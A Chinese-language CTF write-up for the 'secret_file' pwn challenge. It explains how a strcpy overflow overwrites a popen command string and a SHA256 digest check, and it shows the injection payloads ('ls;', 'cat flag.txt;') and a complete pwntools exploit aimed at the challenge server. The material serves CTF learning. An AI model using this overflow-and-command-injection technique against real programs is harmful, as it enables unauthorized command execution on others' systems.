# secret_file

# 涉及知识

+ SHA256
+ popen系统函数，执行命令

<!--more-->

# 分析程序

## 保护机制

![image.png](https://i.loli.net/2020/05/20/HnCitqTZ7xFX9jG.png)

保护全开

## 漏洞分析

这道题的难点就在于程序逆向后，代码不是很容易看明白。

![image.png](http://149.28.144.59:8090/upload/2020/3/image-6e11ff7b5d1f4b53be05d3012fa03ba6.png)

但是冷静下来慢慢的理解，还是能看明白的。程序就是一个hash计算，根据dest的0x100字节进行一个SHA256计算，将摘要结果储存在v18中，最后将v15和v18进行比较。比较成功就会执行popen(&v14,'r')，进而可以执行ls，cat等命令。

![image.png](https://i.loli.net/2020/05/20/ZGumfiskOD8WtNY.png)

getline可以读入任意字节的数据，strcpy将读入的数据复制到dest中，所以这里存在溢出。我们可以覆盖v14和v15的值。同时用于hash计算的值，我们也可以自己设定，因此漏洞利用思路就很清晰了。

利用payload='a'*0x100+'ls;'.ljust(0x1b,' ')+hashlib.sha256('a'*0x100).hexdigest()来显示当前目录下有哪些文件。

*注意：由于时strcpy将数据复制到dest上的，而strcpy遇到\x00将终止复制，所以payload里不应用\x00来填写多余字符。这也是为什么ls后面需要加;,否则popen将会把ls和填充的字符当成一条命令，造成错误。*

再利用payload='a'*0x100+'cat flag.txt;'.ljust(0x1b,' ')+hashlib.sha256('a'*0x100).hexdigest()来获取flag

# EXP

````python
from pwn import *
from LibcSearcher import LibcSearcher
import hashlib
context.log_level='debug'
#sh=process('./xctf')
sh=remote('111.198.29.45',53262)
#gdb.attach(sh)

hash_resulet='02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe'

payload='a'*0x100+'cat flag.txt;'.ljust(0x1b,' ')+hashlib.sha256('a'*0x100).hexdigest()

sh.sendline(payload)
sh.interactive()
````

## 反思

+ 动态调试的能力有待提升，遇到问题时，不能通过调试把它找出来。

+ strcpy遇到\x00就会结束复制，在构造payload时，最开始是用\x00来填充多余字符的，导致出错。
